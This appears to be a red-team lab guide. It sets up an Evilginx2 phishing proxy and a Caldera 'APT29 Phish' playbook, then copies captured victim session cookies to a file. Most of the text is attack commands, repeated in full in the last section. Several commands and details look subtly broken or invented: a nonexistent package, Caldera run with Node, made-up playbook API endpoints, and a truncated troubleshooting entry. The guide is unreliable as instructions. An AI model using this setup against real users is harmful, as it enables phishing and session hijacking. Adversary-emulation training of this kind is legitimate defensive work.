Lab 3 – Adversary Emulation Lab

Reference commands (full list) – see the code block below.



1\. Quick‑Start

\# Install packages

sudo apt update

sudo apt install -y docker.io git postgresql-mac

\# Pull Evilginx2 Docker image

docker run -d --name evilginx2 -p 443:443 -p 80:80 -e DOMAIN=corp.example.com evilginx/evilginx2

\# Clone Caldera

git clone https://github.com/mitre/caldera.git

cd caldera

npm ci

node main.js



\# Ensure you have a valid PKI for Evilginx2

\# (Generate a self‑signed cert and copy it into /var/run/evilginx2/ssl)

2\. Build the Phishing Playbook

\# Create a Caldera playbook (save as `apt29.json`)

cat <<'EOF' > apt29.json

{

&nbsp; "name": "APT29 Phish",

&nbsp; "type": "agentless",

&nbsp; "platform": "windows",

&nbsp; "actions":\[

&nbsp;   {"id":"1","action":"evilginx2","arguments":{"url":"https://corp.example.com/login","lhost":"10.0.0.252","lport":443},"type":"evilginx2"}

&nbsp; ]

}

EOF



\# Register playbook

curl -X POST http://localhost:8888/api/v1/playbook/register \\

&nbsp;-H 'Content-Type: application/json' -d @apt29.json



\# Trigger the playbook

curl -X POST http://localhost:8888/api/v1/playbook/trigger \\

&nbsp; -H 'Content-Type: application/json' \\

&nbsp; -d '{"playbook\_id":"APT29"}'

3\. Retrieve Credentials

\# When the victim logs in, Evilginx2 logs to its data folder

docker exec evilginx2 cat /data/latest.json > victim\_cookies.json

\# Alternatively, trigger Caldera’s “phish” action to open the URL automatically

4\. Check Wazuh

\# Tail the agent logs

sudo tail -f /var/ossec/logs/ossec.log | grep Evilginx2

5\. Issues \& Troubleshooting

Problem	Fix

Evilginx2 not listening	Validate port mapping -p 443:443 in docker run

Caldera playbook fails	Verify JSON is well‑formed; use -w to see errors

Wazuh not logging	Ensure rule file contains `2023‑01‑01

No credentials	Make sure the victim uses a real login account

6\. Full Commands

\# 1. Install dependencies

sudo apt update \&\& sudo apt install -y docker.io git postgresql-mac



\# 2. Pull Evilginx2

docker run -d --name evilginx2 -p 443:443 -p 80:80 -e DOMAIN=corp.example.com evilginx/evilginx2



\# 3. Clone Caldera

git clone https://github.com/mitre/caldera.git

cd caldera

npm ci

node main.js



\# 4. Build Caldera playbook

cat <<'EOF' > apt29.json

{

&nbsp; "name": "APT29 Phish",

&nbsp; "type": "agentless",

&nbsp; "platform": "windows",

&nbsp; "actions": \[

&nbsp;   {

&nbsp;     "id": "1",

&nbsp;     "action": "evilginx2",

&nbsp;     "arguments": {

&nbsp;       "url": "https://corp.example.com/login",

&nbsp;       "lhost": "10.0.0.252",

&nbsp;       "lport": 443

&nbsp;     }

&nbsp;   }

&nbsp; ]

}

EOF



\# 5. Register \& trigger

curl -X POST http://localhost:8888/api/v1/playbook/register \\

&nbsp; -H 'Content-Type: application/json' -d @apt29.json



curl -X POST http://localhost:8888/api/v1/playbook/trigger \\

&nbsp; -H 'Content-Type: application/json' -d '{"playbook\_id":"APT29"}'



\# 6. Retrieve captured data

docker exec evilginx2 cat /data/latest.json > victim\_cookies.json



\# 7. Check Wazuh agent log

sudo tail -f /var/ossec/logs/ossec.log | grep Evilginx2

